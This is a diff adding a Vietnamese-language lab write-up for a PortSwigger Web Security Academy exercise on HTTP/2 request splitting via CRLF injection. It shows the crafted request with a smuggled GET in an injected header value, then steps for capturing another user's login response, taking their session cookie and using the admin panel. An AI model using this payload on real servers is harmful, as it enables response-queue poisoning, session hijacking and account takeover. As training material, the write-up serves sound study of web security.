@@ -521,7 +521,41 @@ Sau khi submit, đợi 15s để user gửi request rồi refresh trang lịch s
 
 Thay thế session cookie của mình thành session cookie thu được, kết quả bài lab được giải thành công.
 # 14. HTTP/2 request splitting via CRLF injection
+Cấu hình request sau:
+```
+POST / HTTP/2
+Host: 0a2a00b104eb10fcc0e8ef3800610024.web-security-academy.net
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
 
+
+```
+Sau đó sử dụng Inspector để thay đổi header `Content-Type` có value là 
+```
+application/x-www-form-urlencoded\r\nGET /404 HTTP/1.1\r\nHost: 0a2a00b104eb10fcc0e8ef3800610024.web-security-academy.net
+```
+Submit requets hai lần, kết quả trả về response `HTTP/2 404 Not Found`. Đó là do quá trình downgrade HTTP/2 xuống HTTP/1 đã tách request header trên thành hai request riêng biệt là
+```
+POST / HTTP/2
+Host: 0a2a00b104eb10fcc0e8ef3800610024.web-security-academy.net
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+```
+và
+```
+GET /404 HTTP/1.1
+Host: 0a2a00b104eb10fcc0e8ef3800610024.web-security-academy.net
+```
+Như vậy, ta có thể exploit HRS để gửi hai request một lúc. Ta exploit như sau:
+1) Gửi request trên, website sẽ trả về response của `POST /` và đẩy response của `GET /404` lên đầu response queue.
+2) Khi user login, response user nhận được sẽ là `HTTP/2 404 Not Found`, và response login của user sẽ được đẩy lên đầu response queue
+3) Ta submit request lần thứ hai, khi đó response nhận được sẽ là response từ request login của user.
+
+Kết quả, ta thu được:
+
+![image](https://user-images.githubusercontent.com/103978452/226235744-85ffdd9f-1acc-47e6-ba45-a644e82694c3.png)
+
+Thay thế session cookie hiện tại bằng session cookie thu được, sau đó vào admin panel xóa user carlos. Kết quả thành công.
 # 15. CL.0 request smuggling
 
 # 16. Exploiting HTTP request smuggling to perform web cache poisoning
